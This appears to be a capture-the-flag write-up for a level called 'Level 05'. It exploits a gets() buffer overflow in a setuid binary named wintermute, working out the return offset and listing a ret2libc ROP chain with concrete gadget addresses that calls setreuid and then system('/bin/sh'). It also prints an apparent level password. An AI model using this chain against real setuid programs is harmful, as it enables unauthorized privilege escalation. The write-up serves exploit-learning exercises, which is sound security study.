# Level 05

x0w8xdgapz3tjopq2s11a27yro7krazm


## Description

```
ls -l
total 28
-r--r--r-- 1 level05 level05    35 Jun  9 23:13 README
-rwsr-x--- 1 flag05  level05 16416 Jun  9 23:13 wintermute
-r--r--r-- 1 level05 level05  2002 Jun  9 23:13 wintermute.c
```

```
readelf -l riviera
...
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RW     0x10
```

Stack is not executable, so we'll need to perform a ret2libc.

## wintermute.c

### run_query() function

```

static void run_query(void) {
    char query[QUERY_SIZE];
    unsigned int h;
...
    gets(query);
...
}
```

Looks like an easy buffer overflow, where we can just inject the previous ROP chain.

## The exploit

### Let's find out the return address offset

From what we learn from previous exercise, we can actually guess from it from the locals. 

```
char query[96]; // 0x60
unsigned int h; // 0x4 + 0xc for alignment
```

`offset = 0x60 + 0x10 + 0x8 = 0x78`

Then we can reuse the ROP chain from `ex03`:

```
[ret_addr: pop rdi gadget] 0x7ffff7d0f84b
[arg1: UID of flag05] 1022
[ret_addr: pop rsi gadget] 0x7ffff7d10b3d
[arg1: UID of flag05] 1022
[ret_addr: setreuid] 0x7ffff7d27330
[ret_addr: pop rdi gadget] 0x7ffff7d0f84b
[arg1: addr of /bin/sh] 0x7ffff7dcc42f
[ret_addr: system] 0x7ffff7c58750
```